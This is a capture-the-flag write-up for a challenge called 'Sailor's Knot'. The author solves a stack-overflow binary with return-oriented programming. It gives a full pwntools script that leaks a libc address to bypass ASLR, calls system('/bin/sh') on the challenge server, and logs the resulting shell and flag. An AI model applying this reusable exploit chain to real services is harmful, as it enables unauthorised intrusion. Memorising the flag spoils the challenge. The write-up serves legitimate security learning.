# Sailor's Knot
There is a huge variety of sailor's knots, but the common thing is they all use rops
or other types of cords.

```
nc 46.101.107.117 2112
```

Get a shell and read the flag.

[sailorsknot](sailorsknot)

---

This is the next level of [LOTL](../../level5/lotl/README.md) from the level 5.

The file type is also the same:
```
$ file sailorsknot
ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=97703c7c27443a213e91b074911c7c744fc34043, not stripped
```

However, this time there is no `profit()` function...

As the challenge description reveals, this
is about [ROP - Return-oriented programming](https://en.wikipedia.org/wiki/Return-oriented_programming).
I had to do some study:
- [Introducing Weird Machines: ROP Differently Explaining part 1 - bin 0x29](https://www.youtube.com/watch?v=8Dcj19KGKWM&t=1s&ab_channel=LiveOverflow) (video)
- [Weird Return-Oriented Programming Tutorial - bin 0x2A](https://www.youtube.com/watch?v=zaQVNM3or7k&t=1s&ab_channel=LiveOverflow) (video)
- [Pwntools ROP Binary Exploitation - DownUnderCTF](https://www.youtube.com/watch?v=i5-cWI_HV8o&ab_channel=JohnHammond) (video)
- [Return-Oriented-Programming (ROP FTW)](https://www.exploit-db.com/docs/english/28479-return-oriented-programming-(rop-ftw).pdf) (PDF)
- [LEAK LIBC ADDRESSES FROM GOT TO EXPLOIT UNKNOWN LIBC, BYPASSING ASLR REMOTELY 64 BIT](https://www.ret2rop.com/2020/04/got-address-leak-exploit-unknown-libc.html) (blog)
- [ROP-PWN template](https://book.hacktricks.xyz/exploiting/linux-exploiting-basic-esp/rop-pwn-template) (code snippet)

The binary contains one extra function `remove_me_before_deploy()`:
```
004007bb 55              PUSH       RBP
004007bc 48 89 e5        MOV        RBP,RSP
004007bf 5f              POP        RDI
004007c0 c3              RET
004007c1 48 31 c0        XOR        RAX,RAX
004007c4 c3              RET
004007c5 48 8d 3d        LEA        RDI,[s_/bin/ls_00400958]                         = "/bin/ls"
         8c 01 00 00
004007cc e8 3f fe        CALL       system                                           int system(char * __command)
         ff ff
004007d1 90              NOP
004007d2 5d              POP        RBP
004007d3 c3              RET
```

Those are some helpful ROP gadgets!

Nevertheless, I was unable to put them to use. I totally missed this:
```
$ strings -t x sailorsknot | grep /bin/sh
1080 Please ensure you remove _all_ references to the /bin/sh
```

I learned about this only after I had solved the challenge with a bit more complicated approach.

I pretty much followed
[Pwntools ROP Binary Exploitation - DownUnderCTF](https://www.youtube.com/watch?v=i5-cWI_HV8o&ab_channel=JohnHammond) (video).

I had issues with [stack alignment](https://wiki.osdev.org/Calling_Conventions#Note3) to 16 bytes,
but once I got around it, all worked just nice:

```python
from pwn import *

context.arch = 'amd64'

elf = ELF("sailorsknot")
rop = ROP(elf)

# First ROP payload to get libc address (bypassing ASLR)
rop.raw(rop.find_gadget(["ret"]))  # Align stack before call to % 16
rop.call("printf", [elf.got["printf"]])
rop.raw(rop.find_gadget(["ret"]))  # Align stack before call to % 16
rop.call("main")
print(rop.dump())

# p = elf.process()  # Local testing
p = remote("46.101.107.117", 2112)

p.recvuntil("\n")  # Welcome! Please give me your name!
p.sendline(b'A' * 40 + rop.chain())
p.recvuntil("\n")  # Hi XYZ, nice to meet you!

printf_address = u64(p.recvuntil("\n")[:6].ljust(8, b"\x00"))  # printf address (6 bytes) + Welcome! Please give ..
print("remote printf address: " + hex(printf_address))  # Address changes with each run (ASLR)

# 'printf' address always ends with e80 (ASLR doesn't change last 3 values because of paging)
# we can do the same exercise for 'gets', the address always ends with 0b0
# using https://libc.blukat.me/ we can determine the exact libc version which is libc6_2.27-3ubuntu1_amd64

# libc = ELF("libc6_2.31-3_amd64.so")  # Local testing
libc = ELF("libc6_2.27-3ubuntu1_amd64.so")

# Set libc base address (current printf address - libc printf offset, 0x064e80 in this version)
libc.address = printf_address - libc.symbols["printf"]
print("libc base address: " + hex(libc.address))

# Second payload to get a remote shell
rop = ROP(libc)
rop.raw(rop.find_gadget(["ret"]))
rop.call("system", [next(libc.search(b"/bin/sh\x00"))])
print(rop.dump())

p.sendline(b'A' * 40 + rop.chain())
p.recvuntil("\n")
p.interactive()
```

It outputs:
```
[*] '/..REDACTED../sailorsknot'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] Loaded 14 cached gadgets for 'sailorsknot'
0x0000:         0x400295 ret
0x0008:         0x4007bf pop rdi; ret
0x0010:         0x601028 [arg0] rdi = got.printf
0x0018:         0x400620 printf
0x0020:         0x400295 ret
0x0028:         0x400757 main()
[x] Opening connection to 46.101.107.117 on port 2112
[x] Opening connection to 46.101.107.117 on port 2112: Trying 46.101.107.117
[+] Opening connection to 46.101.107.117 on port 2112: Done
remote printf address: 0x7f1f6e4e7e80
[*] '/..REDACTED../libc6_2.27-3ubuntu1_amd64.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
libc base address: 0x7f1f6e483000
[*] Loaded 198 cached gadgets for 'libc6_2.27-3ubuntu1_amd64.so'
0x0000:   0x7f1f6e4838aa ret
0x0008:   0x7f1f6e4a455f pop rdi; ret
0x0010:   0x7f1f6e636e9a [arg0] rdi = 139772972723866
0x0018:   0x7f1f6e4d2440 system
[*] Switching to interactive mode
id
uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
ls
challenge2
flag
ynetd
cat flag
he2021{s41l0r_r0p_f0r_pr0f1t}
```

The flag is `he2021{s41l0r_r0p_f0r_pr0f1t}`

I learned a lot here! Thank you for this challenge!